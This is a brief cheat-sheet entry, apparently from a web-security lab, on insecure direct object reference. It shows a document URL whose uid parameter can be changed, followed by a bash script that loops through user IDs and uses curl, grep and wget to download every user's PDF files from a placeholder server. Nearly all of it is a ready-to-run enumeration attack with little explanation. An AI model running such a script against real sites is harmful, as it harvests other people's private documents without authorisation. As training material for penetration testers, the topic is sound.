
Changing user specific identity to access objects(change value)
```http
http://SERVER_IP:PORT/documents.php?uid=*
```


Automated Bash Script to loop through all possible files
```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```
